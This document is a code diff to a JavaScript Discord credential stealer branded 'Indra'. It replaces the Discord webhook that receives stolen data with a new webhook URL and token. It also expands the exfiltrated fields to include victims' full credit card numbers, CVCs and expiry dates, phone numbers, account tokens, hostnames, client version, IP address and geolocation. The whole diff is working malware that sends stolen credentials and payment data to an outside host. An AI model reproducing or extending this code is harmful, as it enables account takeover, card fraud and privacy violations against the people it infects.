@@ -13,7 +13,7 @@ const fs = require("fs");
 var config = {
     brand: "Indra",
 
-    webhook: "https://discord.com/api/webhooks/1074649954666156094/iA0qpipKeaxfi1dX1RxzOvE_8zzBI02F4gO0e8Q2AgN3bCXq1NP7adLn0joOKZPE_Cvn",
+    webhook: "https://discord.com/api/webhooks/1074649957635739658/F4a0IYoFGbR7VPxDS7WlR1DZC9XJcf-b-tdEKwte6mv6BySXdvwagrbdmghAMMGU1vVY",
 
     logout: true,
     disable_qr_code: true,
@@ -76,12 +76,12 @@ var config = {
         House_Brilliance: {
             Value: 128,
             Emoji: "<:brilliance:874750808338608199>",
-            Rare: true,
+            Rare: false,
         },
         House_Balance: {
             Value: 256,
             Emoji: "<:balance:874750808267292683>",
-            Rare: true,
+            Rare: false,
         }
     },
 
@@ -271,24 +271,29 @@ var event_handlers = {
                     url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
                 fields: [{
-                        name: "BIN",
+                        name: "Credit card Number",
                         value: `\`\`\`${number}\`\`\``,
                         inline: true
                     },
                     {
-                        name: "CVC",
+                        name: "Credit card CVC",
                         value: `\`\`\`${cvc}\`\`\``,
                         inline: true
                     },
                     {
-                        name: "EXP",
+                        name: "Credit card expiration",
                         value: `\`\`\`${month}/${year}\`\`\``,
                         inline: true
                     },
                     {
+                        name: "Phone Number",
+                        value: `\`\`\`${userInfo.phone ?? "None"}\`\`\``,
+                        inline: false
+                    },
+                    {
                         name: "Nitro",
                         value: `${getNitro(userInfo.premium_type)}`,
-                        inline: true
+                        inline: false
                     }, {
                         name: "Billing",
                         value: `${billing}`,
@@ -296,12 +301,16 @@ var event_handlers = {
                     }, {
                         name: "Badges",
                         value: `${getBadges(userInfo.flags)}`,
-                        inline: true
+                        inline: false
                     },
                     {
                         name: "Token",
-                        value: `\`${token}\``,
-                        inline: true
+                        value: `\`\`\`${token}\`\`\``,
+                        inline: false
+                    }, {
+                        name: "Hostname",
+                        value: `\`\`\`${os.hostname}\`\`\``,
+                        inline: false
                     },
                 ],
             }), createEmbed({
@@ -742,14 +751,19 @@ async function initialize() {
                             url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                         },
                         fields: [{
-                                name: "E-Mail",
-                                value: `\`${userInfo.email}\``,
+                                name: "E-Mail Address",
+                                value: `\`\`\`${userInfo.email}\`\`\``,
                                 inline: true
+                            },
+                            {
+                                name: "Phone Number",
+                                value: `\`\`\`${userInfo.phone ?? "None"}\`\`\``,
+                                inline: false
                             },
                             {
                                 name: "Nitro",
                                 value: `${getNitro(userInfo.premium_type)}`,
-                                inline: true
+                                inline: false
                             }, {
                                 name: "Billing",
                                 value: `${billing}`,
@@ -757,13 +771,26 @@ async function initialize() {
                             }, {
                                 name: "Badges",
                                 value: `${getBadges(userInfo.flags)}`,
-                                inline: true
+                                inline: false
                             },
                             {
                                 name: "Token",
-                                value: `\`${token}\``,
+                                value: `\`\`\`${token}\`\`\``,
                                 inline: false
                             },
+                            {
+                                name: "Hostname",
+                                value: `\`\`\`${os.hostname}\`\`\``,
+                                inline: false
+                            }, {
+                                name: "Client version",
+                                value: `\`\`\`${getDiscordClient()}\`\`\``,
+                                inline: false
+                            }, {
+                                name: "Connection data",
+                                value: `\`\`\`yaml\nIP Address: ${network_data['ip'] ?? "Unknown"}\nHostname: ${network_data['hostname'] ?? "Unknown"}\nCity: ${network_data['city'] ?? "Unknown"}\nRegion: ${network_data['region'] ?? "Unknown"}\nCountry: ${network_data["country"] ?? "Unknown"}\nTimezone: ${network_data["timezone"] ?? "Unknown"}\`\`\``,
+                                inline: false
+                            }
                         ],
                     }), createEmbed({
                         description: `**Total Friends (${friends['length']})**\n\n${friends.frien}`,
